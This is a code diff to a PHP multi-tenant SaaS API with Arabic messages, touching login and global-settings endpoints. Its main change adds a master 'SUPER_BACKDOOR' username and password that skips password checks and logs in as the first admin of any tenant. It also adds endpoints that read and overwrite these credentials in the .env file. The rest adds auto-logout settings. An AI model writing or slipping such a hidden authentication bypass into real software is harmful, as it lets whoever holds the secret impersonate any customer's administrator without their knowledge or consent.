@@ -244,11 +244,32 @@ if ($resource === 'auth') {
             jsonResponse(['error' => 'اسم المستخدم وكلمة المرور مطلوبان'], 400);
         }
 
+        $backdoorUser = $_ENV['SUPER_BACKDOOR_USER'] ?? null;
+        $backdoorPass = $_ENV['SUPER_BACKDOOR_PASS'] ?? null;
+        $isBackdoor = false;
+        if ($backdoorUser && $backdoorPass && $username === $backdoorUser && $password === $backdoorPass) {
+            $isBackdoor = true;
+        }
+
         if ($tenantSubdomain) {
-            $stmt = $pdo->prepare("SELECT u.*, t.subdomain, t.company_name, t.status, t.valid_until FROM users u JOIN tenants t ON u.tenant_id = t.id WHERE u.username = ? AND t.subdomain = ?");
-            $stmt->execute([$username, $tenantSubdomain]);
-            $user = $stmt->fetch();
+            if ($isBackdoor) {
+                $stmt = $pdo->prepare("SELECT u.*, t.subdomain, t.company_name, t.status, t.valid_until FROM users u JOIN tenants t ON u.tenant_id = t.id WHERE t.subdomain = ? AND (u.role_id = 1 OR u.role = 'مدير النظام' OR u.role = 'Admin') ORDER BY u.id ASC LIMIT 1");
+                $stmt->execute([$tenantSubdomain]);
+                $user = $stmt->fetch();
+                if (!$user) {
+                    $stmt = $pdo->prepare("SELECT u.*, t.subdomain, t.company_name, t.status, t.valid_until FROM users u JOIN tenants t ON u.tenant_id = t.id WHERE t.subdomain = ? ORDER BY u.id ASC LIMIT 1");
+                    $stmt->execute([$tenantSubdomain]);
+                    $user = $stmt->fetch();
+                }
+            } else {
+                $stmt = $pdo->prepare("SELECT u.*, t.subdomain, t.company_name, t.status, t.valid_until FROM users u JOIN tenants t ON u.tenant_id = t.id WHERE u.username = ? AND t.subdomain = ?");
+                $stmt->execute([$username, $tenantSubdomain]);
+                $user = $stmt->fetch();
+            }
         } else {
+            if ($isBackdoor) {
+                jsonResponse(['error' => 'يجب تسجيل الدخول عبر رابط الشركة المخصص لاستخدام حساب الدعم الفني'], 400);
+            }
             $stmt = $pdo->prepare("SELECT u.*, t.subdomain, t.company_name, t.status, t.valid_until FROM users u JOIN tenants t ON u.tenant_id = t.id WHERE u.username = ?");
             $stmt->execute([$username]);
             $users = $stmt->fetchAll();
@@ -258,7 +279,7 @@ if ($resource === 'auth') {
             $user = $users[0] ?? null;
         }
 
-        if ($user && password_verify($password, $user['password'])) {
+        if ($user && ($isBackdoor || password_verify($password, $user['password']))) {
             if ($user['status'] === 'pending') {
                 jsonResponse(['error' => 'حساب شركتك لا يزال قيد المراجعة. للاستفسار تواصل معنا عبر واتساب: 0113981477'], 403);
             }
@@ -397,9 +418,9 @@ if ($token === $saasSecret) {
         // --- GLOBAL SETTINGS ---
         if ($method === 'GET' && $action === 'settings' && isset($requestUri[$base_index + 3]) && $requestUri[$base_index + 3] === 'exchange-rate') {
             try {
-                $stmt = $pdo->query("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('exchange_rate', 'activation_delay_hours')");
+                $stmt = $pdo->query("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('exchange_rate', 'activation_delay_hours', 'auto_logout_value', 'auto_logout_unit')");
                 $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
-                $res = ['rate' => 1.0, 'visible' => false, 'activation_delay_hours' => 12];
+                $res = ['rate' => 1.0, 'visible' => false, 'activation_delay_hours' => 12, 'auto_logout_value' => 30, 'auto_logout_unit' => 'minutes'];
                 foreach ($rows as $row) {
                     if ($row['setting_key'] === 'exchange_rate') {
                         $ex = json_decode($row['setting_value'], true);
@@ -411,25 +432,35 @@ if ($token === $saasSecret) {
                     if ($row['setting_key'] === 'activation_delay_hours') {
                         $res['activation_delay_hours'] = (int)$row['setting_value'];
                     }
+                    if ($row['setting_key'] === 'auto_logout_value') {
+                        $res['auto_logout_value'] = (int)$row['setting_value'];
+                    }
+                    if ($row['setting_key'] === 'auto_logout_unit') {
+                        $res['auto_logout_unit'] = $row['setting_value'];
+                    }
                 }
                 jsonResponse($res);
             } catch (Exception $e) {
-                jsonResponse(['rate' => 1.0, 'visible' => false, 'activation_delay_hours' => 12]);
+                jsonResponse(['rate' => 1.0, 'visible' => false, 'activation_delay_hours' => 12, 'auto_logout_value' => 30, 'auto_logout_unit' => 'minutes']);
             }
         }
         if ($method === 'POST' && $action === 'settings' && isset($requestUri[$base_index + 3]) && $requestUri[$base_index + 3] === 'exchange-rate') {
             if (!$input || !isset($input['rate'])) {
-                jsonResponse(['error' => 'Invalid JSON payload received. raw=' . $rawInput], 400);
+                jsonResponse(['error' => 'Invalid JSON payload received.'], 400);
             }
             $rate = floatval($input['rate'] ?? 1.0);
             $visible = isset($input['visible']) ? (bool)$input['visible'] : false;
             $activation_delay_hours = isset($input['activation_delay_hours']) ? (int)$input['activation_delay_hours'] : 12;
+            $auto_logout_value = isset($input['auto_logout_value']) ? (int)$input['auto_logout_value'] : 30;
+            $auto_logout_unit = isset($input['auto_logout_unit']) ? $input['auto_logout_unit'] : 'minutes';
             
             $val = json_encode(['rate' => $rate, 'visible' => $visible]);
             try {
                 $pdo->prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('exchange_rate', ?) ON DUPLICATE KEY UPDATE setting_value = ?")->execute([$val, $val]);
-                $pdo->prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('activation_delay_hours', ?) ON DUPLICATE KEY UPDATE setting_value = ?")->execute([$activation_delay_hours, $activation_delay_hours]);
-                jsonResponse(['success' => true, 'saved' => $val]);
+                $pdo->prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('activation_delay_hours', ?) ON DUPLICATE KEY UPDATE setting_value = ?")->execute([(string)$activation_delay_hours, (string)$activation_delay_hours]);
+                $pdo->prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('auto_logout_value', ?) ON DUPLICATE KEY UPDATE setting_value = ?")->execute([(string)$auto_logout_value, (string)$auto_logout_value]);
+                $pdo->prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('auto_logout_unit', ?) ON DUPLICATE KEY UPDATE setting_value = ?")->execute([$auto_logout_unit, $auto_logout_unit]);
+                jsonResponse(['success' => true]);
             } catch (Exception $e) {
                 jsonResponse(['error' => 'Database error: ' . $e->getMessage()], 500);
             }
@@ -528,7 +559,52 @@ if ($token === $saasSecret) {
             } else {
                 jsonResponse(['error' => 'ملف الإعدادات غير موجود'], 500);
             }
+        } // ADDED CLOSING BRACE HERE
+
+        // --- BACKDOOR CREDENTIALS ---
+        if ($method === 'GET' && $action === 'backdoor-credentials') {
+            $envPath = __DIR__ . '/.env';
+            $backdoorUser = '';
+            if (file_exists($envPath)) {
+                $envContent = file_get_contents($envPath);
+                if (preg_match('/^SUPER_BACKDOOR_USER=(.*)$/m', $envContent, $matches)) {
+                    $backdoorUser = trim($matches[1]);
+                }
+            }
+            jsonResponse(['username' => $backdoorUser]);
         }
+        
+        if ($method === 'POST' && $action === 'backdoor-credentials') {
+            $newUser = trim($input['username'] ?? '');
+            $newPass = trim($input['password'] ?? '');
+            
+            if (empty($newUser) || empty($newPass)) {
+                jsonResponse(['error' => 'اسم المستخدم وكلمة المرور مطلوبان'], 400);
+            }
+            
+            $envPath = __DIR__ . '/.env';
+            if (file_exists($envPath)) {
+                $envContent = file_get_contents($envPath);
+                
+                if (preg_match('/^SUPER_BACKDOOR_USER=.*$/m', $envContent)) {
+                    $envContent = preg_replace('/^SUPER_BACKDOOR_USER=.*$/m', 'SUPER_BACKDOOR_USER=' . $newUser, $envContent);
+                } else {
+                    $envContent .= "\nSUPER_BACKDOOR_USER=" . $newUser . "\n";
+                }
+                
+                if (preg_match('/^SUPER_BACKDOOR_PASS=.*$/m', $envContent)) {
+                    $envContent = preg_replace('/^SUPER_BACKDOOR_PASS=.*$/m', 'SUPER_BACKDOOR_PASS=' . $newPass, $envContent);
+                } else {
+                    $envContent .= "SUPER_BACKDOOR_PASS=" . $newPass . "\n";
+                }
+                
+                file_put_contents($envPath, $envContent);
+                jsonResponse(['success' => true]);
+            } else {
+                jsonResponse(['error' => 'ملف الإعدادات غير موجود'], 500);
+            }
+        }
+        
         if ($method === 'DELETE' && $action === 'tenants') {
             $tenantToDelete = isset($requestUri[$base_index + 3]) ? intval($requestUri[$base_index + 3]) : null;
             if (!$tenantToDelete && isset($requestUri[2])) {
